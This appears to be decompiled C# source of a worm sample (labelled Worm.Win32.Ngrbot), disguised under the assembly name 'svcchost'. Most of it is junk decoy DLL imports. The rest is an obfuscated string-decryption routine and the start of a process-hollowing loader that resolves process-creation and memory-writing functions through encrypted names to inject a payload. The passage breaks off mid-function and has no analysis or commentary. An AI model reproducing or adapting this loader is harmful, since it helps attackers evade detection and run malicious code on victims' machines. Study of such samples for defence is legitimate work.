// Decompiled with JetBrains decompiler
// Type: svcchost.Ʀυŋƥȝƪąƨƨ
// Assembly: svcchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 08BB3140-5D00-4E7B-85E3-720CFAC816B7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.Win32.Ngrbot.dvq-62ed2e37a642b15c0487d42e636d3b602ad316b72a22d53d0a48abe94e72b9a3.exe

using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace svcchost
{
  public class Ʀυŋƥȝƪąƨƨ
  {
    public const int MAXPNAMELEN11 = 32;
    public const int MAXPNAMELEN211 = 32;
    public const int MIXER_SHORT_NAME_CHARS11 = 16;
    public const int MIXER_LONG_NAME_CHARS11 = 64;

    [DebuggerNonUserCode]
    public Ʀυŋƥȝƪąƨƨ()
    {
    }

    [DllImport("yrtyor6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyrhhqk6op();

    [DllImport("yrtyr6pop.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyqro6p();

    [DllImport("j43yttj6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int jq43yty6();

    [DllImport("j43ytoi6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int jq43qyt6o();

    [DllImport("yt3y5rtyrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr yt3y5qrt3rty();

    [DllImport("yt3y5r3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr yy5r3qyrty();

    [DllImport("yt3yrt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr yt3yrqt3yrty();

    [DllImport("yrtyrl6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyrk6qp();

    [DllImport("yrjtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyqrkk6p();

    [DllImport("yrt44yr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyrq44K6p();

    [DllImport("lkwdjsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkwqkdsdnjfe();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkqwdsdknjfe();

    [DllImport("j43ykjmt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int jq43ykjmt6();

    [DllImport("j43yKt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int jq43yKt6();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int j4q3yt6t();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkwqdrsdnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkwqdesdnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkwqdwsdnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtywqr6p();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtysqr6p();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkwqdxsdnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkqwdss5dnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkqwdssdnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ytq3y5rtrty();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr yt3y5qr3yrty();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr yt3yq5rt3ty();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkqwdsdnje();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lqkwdsfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lqkwdjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkqwdsdfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment lkqwdsdnjfe();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int jr4q3yt6();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int j43yqfgt6();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int j43qyt6();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyqer6p();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyqrt6p();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtqye6p();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyr6qp();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName yrtyqtr6p();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr yt3yqyy5rt3yrty();

    [DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr ytrt3yqrty();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq1();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq2();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aqq3();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName bq1();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr cqq1();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName bq2();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq4();

    [DllImport("j43yt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int cq2();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq5();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName bq3();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq7();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr dq2();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq8();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq9();

    [DllImport("j43yt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int c4q();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName b5q();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName bq9();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr dq3();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr dq4();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName qb6();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq15();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr dq5();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq10();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName b7q();

    [DllImport("j43yt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int c5q();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr qd6();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq11();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment qa12();

    [DllImport("j43yt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int cq6();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq13();

    [DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern AssemblyName bq8();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr dq7();

    [DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr dq8();

    [DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern Environment aq14();

    [DllImport("j43yt6.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int cq7();

    [DllImport("user32", EntryPoint = "OemToCharBuffA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int OemToCharBuffq1(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszSrc,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszDst,
      int cchDstLength);

    [DllImport("user32", EntryPoint = "OemToCharBuffA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int OemToCharBuffq(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszSrc,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszDst,
      int cchDstLength);

    [DllImport("gdi32", EntryPoint = "OffsetRgn", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int OffsetRgnq(int hRgn, int x, int y);

    [DllImport("ole32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void OleUninitializeq();

    [DllImport("gdi32", EntryPoint = "OffsetViewportOrgEx", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int OffsetViewportOrgExq(
      int hdc,
      int nX,
      int nY,
      Ʀυŋƥȝƪąƨƨ.POINTAPI11 lpPoint);

    [DllImport("advapi32.dll", EntryPoint = "AccessCheckAndAuditAlarmA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AccessCheckAndAuditAlarmq(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string SubsystemName,
      byte[] HandleId,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectStructureName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectName,
      Ʀυŋƥȝƪąƨƨ.SECURITY_DESCRIPTOR1 SecurityDescriptor,
      int DesiredAccess,
      Ʀυŋƥȝƪąƨƨ.GENERIC_MAPPING1 GenericMapping,
      int ObjectCreation,
      int GrantedAccess,
      int AccessStatus,
      int pfGenerateOnClose);

    [DllImport("pdh.dll", EntryPoint = "PdhVbAddCounter", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int PdhAddCounterq(
      int QueryHandle,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string CounterPath,
      ref int CounterHandle);

    [DllImport("winspool.drv", EntryPoint = "AbortPrinter", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AbortPrinterq(int hPrinter);

    [DllImport("user32", EntryPoint = "ActivateKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ActivateKeyboardLayoutq(int HKL, int flags);

    [DllImport("advapi32.dll", EntryPoint = "QueryServiceObjectSecurity", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int QueryServiceObjectSecurityq(
      int hService,
      int dwSecurityInformation,
      byte[] lpSecurityDescriptor,
      int cbBufSize,
      int pcbBytesNeeded);

    [DllImport("gdi32", EntryPoint = "Polyline", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int Polylineq(int hdc, Ʀυŋƥȝƪąƨƨ.POINTAPI111 lpPoint, int nCount);

    [DllImport("advapi32.dll", EntryPoint = "AddAccessAllowedAce", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AddAccessAllowedAcqqe(
      Ʀυŋƥȝƪąƨƨ.ACL21 pAcl,
      int dwAceRevision,
      int AccessMask,
      byte[] pSid);

    [DllImport("gdi32", EntryPoint = "AbortDoc", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AqbortDoc(int hdc);

    [DllImport("kernel32", EntryPoint = "RaiseException", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void RaiseExcqeption(
      int dwExceptionCode,
      int dwExceptionFlags,
      int nNumberOfArguments,
      int lpArguments);

    [DllImport("advapi32.dll", EntryPoint = "AddAccessDeniedAce", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AddAqccessDeniedAce(
      Ʀυŋƥȝƪąƨƨ.ACL31 pAcl,
      int dwAceRevision,
      int AccessMask,
      byte[] pSid);

    [DllImport("kernel32", EntryPoint = "ReadConsoleA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ReaqdConsole(
      int hConsoleInput,
      byte[] lpBuffer,
      int nNumberOfCharsToRead,
      int lpNumberOfCharsRead,
      byte[] lpReserved);

    [DllImport("advapi32.dll", EntryPoint = "AddAuditAccessAce", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AddAuditAqccessAce(
      Ʀυŋƥȝƪąƨƨ.ACL1 pAcl,
      int dwAceRevision,
      int dwAccessMask,
      byte[] pSid,
      int bAuditSuccess,
      int bAuditFailure);

    [DllImport("gdi32", EntryPoint = "AngleArc", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AqngleArc(
      int hdc,
      int x,
      int y,
      int dwRadius,
      double eStartAngle,
      double eSweepAngle);

    [DllImport("advapi32.dll", EntryPoint = "AllocateLocallyUniqueId", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AllqocateLocallyUniqueId(Ʀυŋƥȝƪąƨƨ.LARGE_INTEGER1 Luid);

    [DllImport("winspool.drv", EntryPoint = "AddJobA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AddaJob(
      int hPrinter,
      int Level,
      byte pData,
      int cdBuf,
      int pcbNeeded);

    [DllImport("winspool.drv", EntryPoint = "ReadPrinter", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ReaqdPrinter(int hPrinter, byte[] pBuf, int cdBuf, int pNoBytesRead);

    [DllImport("advapi32.dll", EntryPoint = "ReadEventLogA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ReadEqventLog(
      int hEventLog,
      int dwReadFlags,
      int dwRecordOffset,
      Ʀυŋƥȝƪąƨƨ.EVENTLOGRECORD1 lpBuffer,
      int nNumberOfBytesToRead,
      int pnBytesRead,
      int pnMinNumberOfBytesNeeded);

    [DllImport("kernel32", EntryPoint = "ReadConsoleOutputAttribute", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ReadConqsoleOutputAttribute(
      int hConsoleOutput,
      int lpAttribute,
      int nLength,
      Ʀυŋƥȝƪąƨƨ.COORD11 dwReadCoord,
      int lpNumberOfAttrsRead);

    [DllImport("gdi32", EntryPoint = "AnimatePalette", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AnimatePalqette(
      int hPalette,
      int wStartIndex,
      int wNumEntries,
      Ʀυŋƥȝƪąƨƨ.PALETTEENTRY1 lpPaletteColors);

    [DllImport("gdi32", EntryPoint = "AddFontResourceA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int AddFontReqsource([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

    [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfigA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ChangeServqiceConfig(
      int hService,
      int dwServiceStructure,
      int dwStartStructure,
      int dwErrorControl,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBinaryPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLoadOrderGroup,
      int lpdwTagId,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDependencies,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpServiceStartName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpPassword,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDisplayName);

    [DllImport("kernel32", EntryPoint = "CompareStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int CompqareString(
      int Locale,
      int dwCmpFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString1,
      int cchCount1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString2,
      int cchCount2);

    [DllImport("imm32.dll", EntryPoint = "ImmGetIMEFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ImmGetqIMEFileName(int hkl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpStr, int uBufLen);

    [DllImport("winmm.dll", EntryPoint = "waveOutPause", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int waveqOutPause(int hWaveOut);

    [DllImport("winmm.dll", EntryPoint = "waveOutUnprepareHeader", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int waveOqutUnprepareHeader(
      int hWaveOut,
      Ʀυŋƥȝƪąƨƨ.WAVEHDR11 lpWaveOutHdr,
      int uSize);

    [DllImport("advapi32.dll", EntryPoint = "RegQueryValueA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int RegQqueryValue(
      int hKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValue,
      int lpcbValue);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SenqdMessage(int hwnd, int wMsg, int wParam, byte[] lParam);

    [DllImport("imm32.dll", EntryPoint = "ImmSetCandidateWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ImmSqetCandidateWindow(
      int himc,
      Ʀυŋƥȝƪąƨƨ.CANDIDATEFORM1 lpCandidateForm);

    [DllImport("gdi32", EntryPoint = "SetArcDirection", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SetArcqDirection(int hdc, int ArcDirection);

    [DllImport("user32", EntryPoint = "SetClipboardData", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SqetClipboardData(int wFormat, int hMem);

    [DllImport("wininet.dll", EntryPoint = "InternetConnectA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int InterqnetConnect(
      int hInternetSession,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string sServerName,
      short nServerPort,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string sUsername,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string sPassword,
      int lService,
      int lFlags,
      int lContext);

    [DllImport("imm32.dll", EntryPoint = "ImmSetStatusWindowPos", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ImmSetSqtatusWindowPos(int himc, Ʀυŋƥȝƪąƨƨ.POINTAPI11 lpPoint);

    [DllImport("imm32.dll", EntryPoint = "ImmSetCompositionWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ImmSeqtCompositionWindow(
      int himc,
      Ʀυŋƥȝƪąƨƨ.COMPOSITIONFORM1 lpCompositionForm);

    [DllImport("user32", EntryPoint = "IsCharAlphaNumericA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int IsCharqAlphaNumeric(byte Char2);

    [DllImport("kernel32", EntryPoint = "LocalReAlloc", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int LocalRqeAlloc(int hMem, int wBytes, int wFlags);

    [DllImport("kernel32", EntryPoint = "LockResource", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int LockReqsource(int hResData);

    [DllImport("winmm.dll", EntryPoint = "mciGetDeviceIDFromElementIDA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mciGetqDeviceIDFromElementID(
      int dwElementID,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrStructure);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mcqiSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString,
      int uReturnLength,
      int hwndCallback);

    [DllImport("winmm", EntryPoint = "mciSetYieldProc", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mciqSetYieldProc(int mciId, int fpYieldProc, int dwYieldData);

    [DllImport("winmm.dll", EntryPoint = "midiInGetDevCapsA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int midqInGetDevCaps(
      int uDeviceID,
      Ʀυŋƥȝƪąƨƨ.MIDIINCAPS11 lpCaps,
      int uSize);

    [DllImport("winmm.dll", EntryPoint = "midiInAddBuffer", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int midiqInAddBuffer(
      int hMidiIn,
      Ʀυŋƥȝƪąƨƨ.MIDIHDR11 lpMidiInHdr,
      int uSize);

    [DllImport("winmm.dll", EntryPoint = "mixerGetID", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerGqetID(int hmxobj, int pumxID, int fdwId);

    [DllImport("winmm.dll", EntryPoint = "mixerGetNumDevs", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerqGetNumDevs();

    [DllImport("winmm.dll", EntryPoint = "mixerMessage", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerMqessage(int hmx, int uMsg, int dwParam1, int dwParam2);

    [DllImport("winmm.dll", EntryPoint = "mixerOpen", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerqOpen(
      int phmx,
      int uMxId,
      int dwCallback,
      int dwInstance,
      int fdwOpen);

    [DllImport("winmm.dll", EntryPoint = "mmioClose", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mmioCqlose(int hmmio, int uFlags);

    [DllImport("winmm.dll", EntryPoint = "mixerGetLineControlsA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerqGetLineControls(
      int hmxobj,
      Ʀυŋƥȝƪąƨƨ.MIXERLINECONTROLS111 pmxlc,
      int fdwControls);

    [DllImport("winmm.dll", EntryPoint = "mixerGetDevCapsA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerGqetDevCaps(
      int uMxId,
      Ʀυŋƥȝƪąƨƨ.MIXERCAPS11 pmxcaps,
      int cbmxcaps);

    [DllImport("winmm.dll", EntryPoint = "mixerGetControlDetailsA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int mixerGqetControlDetails(
      int hmxobj,
      Ʀυŋƥȝƪąƨƨ.MIXERCONTROLDETAILS11 pmxcd,
      int fdwDetails);

    public static bool Ϣƚŋ7() => Environment.OSVersion.Version.Major == 6;

    public static string DecryptData(string Input, string key)
    {
      if (Input == null)
        throw new ArgumentNullException(nameof (Input));
      if (key == null)
        throw new ArgumentNullException(nameof (key));
      return Encoding.UTF8.GetString(Ʀυŋƥȝƪąƨƨ.DecryptData(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(key)));
    }

    public static byte[] DecryptData(byte[] Input, byte[] key)
    {
      if (Input == null)
        throw new ArgumentNullException(nameof (Input));
      if (key == null)
        throw new ArgumentNullException(nameof (key));
      byte num1 = Input[checked (Input.Length - 1)];
      byte[] numArray = new byte[checked (Input.Length - 2 + 1)];
      int index1 = 0;
      int num2 = checked (Input.Length - 2);
      int index2 = 0;
      while (index2 <= num2)
      {
        if (index1 >= key.Length)
          index1 = 0;
        if (index2 < checked (Input.Length - 1))
        {
          numArray[index2] = Convert.ToByte(checked ((int) Input[index2] - unchecked (numArray.Length % key.Length) - (int) key[index1] + (int) num1));
          checked { ++index1; }
        }
        checked { ++index2; }
      }
      return numArray;
    }

    public static void ƦυŋƥȝƧυƀ(byte[] Ƌąƫą, string ƫąṟǥȝƫ)
    {
      Ʀυŋƥȝƪąƨƨ.Cøŋƫȝϫƫ Cøŋƫȝϫƫ = new Ʀυŋƥȝƪąƨƨ.Cøŋƫȝϫƫ();
      Ʀυŋƥȝƪąƨƨ.ǷṟøcȝƨƨƗŋƒøṟɱąƫƚøŋ info = new Ʀυŋƥȝƪąƨƨ.ǷṟøcȝƨƨƗŋƒøṟɱąƫƚøŋ();
      Ʀυŋƥȝƪąƨƨ.ƧƫąṟƫυƥƗŋƒøṟɱąƫƚøŋ startup = new Ʀυŋƥȝƪąƨƨ.ƧƫąṟƫυƥƗŋƒøṟɱąƫƚøŋ();
      Ʀυŋƥȝƪąƨƨ.ƧȝcυṟƚƫƴƑƪąǥƨ process1 = new Ʀυŋƥȝƪąƨƨ.ƧȝcυṟƚƫƴƑƪąǥƨ();
      Ʀυŋƥȝƪąƨƨ.ƧȝcυṟƚƫƴƑƪąǥƨ thread = new Ʀυŋƥȝƪąƨƨ.ƧȝcυṟƚƫƴƑƪąǥƨ();
      Ʀυŋƥȝƪąƨƨ.ŊƫĦȝąƋȝṟƨ ŋƫĦȝąƋȝṟƨ = new Ʀυŋƥȝƪąƨƨ.ŊƫĦȝąƋȝṟƨ();
      GCHandle gcHandle = GCHandle.Alloc((object) Ƌąƫą, GCHandleType.Pinned);
      IntPtr ptr = gcHandle.AddrOfPinnedObject();
      int int32_1 = ptr.ToInt32();
      Ʀυŋƥȝƪąƨƨ.ƉøƨĦȝąƋȝṟ ɖøƨĦȝąƋȝṟ = new Ʀυŋƥȝƪąƨƨ.ƉøƨĦȝąƋȝṟ();
      Ʀυŋƥȝƪąƨƨ.ƉøƨĦȝąƋȝṟ structure1 = (Ʀυŋƥȝƪąƨƨ.ƉøƨĦȝąƋȝṟ) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), ɖøƨĦȝąƋȝṟ.GetType());
      gcHandle.Free();
      ptr = new IntPtr(checked (int32_1 + structure1.ĄƋƋṟȝƨƨ));
      Ʀυŋƥȝƪąƨƨ.ŊƫĦȝąƋȝṟƨ structure2 = (Ʀυŋƥȝƪąƨƨ.ŊƫĦȝąƋȝṟƨ) Marshal.PtrToStructure(ptr, ŋƫĦȝąƋȝṟƨ.GetType());
      Ʀυŋƥȝƪąƨƨ.CP cp = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.CP>(Ʀυŋƥȝƪąƨƨ.DecryptData("o8/n356rqJEB ", "1cnj28nXZWMB"), Ʀυŋƥȝƪąƨƨ.DecryptData("uOTCuPjXw8nqm8Lk+LEB ", "hePJwefJn+Pdxcnl5YEB"));
      Ʀυŋƥȝƪąƨƨ.GTC gtc = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.GTC>(Ʀυŋƥȝƪąƨƨ.DecryptData("0LapqcuSaVAZ ", "vbHLw7G/TUsZ"), Ʀυŋƥȝƪąƨƨ.DecryptData("or6zm8mgwqTOm9Pbzb/Hrxk= ", "dbHPj7fLsamvbcXDz7HXzxk="));
      Ʀυŋƥȝƪąƨƨ.RPM rpm1 = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.RPM>(Ʀυŋƥȝƪąƨƨ.DecryptData("vKWYhLeBWYcp ", "raG7s6GvPTsp"), Ʀυŋƥȝƪąƨƨ.DecryptData("n4OQpqaNvILBtY2dw7eI0tAp ", "e6GZn3e7tZ2hvb1xobG1u8kp"));
      Ʀυŋƥȝƪąƨƨ.WPM wpm1 = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.WPM>(Ʀυŋƥȝƪąƨƨ.DecryptData("zMKVo8ijVVYc ", "uq7IwK68Skgc"), Ʀυŋƥȝƪąƨƨ.DecryptData("uNvInNWRnqrSqLTatc7VsM7gHA== ", "ksi2zK6EyMKqrsrKfq6+wsjWHA=="));
      Ʀυŋƥȝƪąƨƨ.UVS uvs = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.UVS>(Ʀυŋƥȝƪąƨƨ.DecryptData("2LOojdUU ", "yNS0xMQU"), Ʀυŋƥȝƪąƨƨ.DecryptData("ycXGxeau0cvjr+B62sfWrumzuqAU ", "oNqWyMauzJi+ttqKuJK2stS+ysgU"));
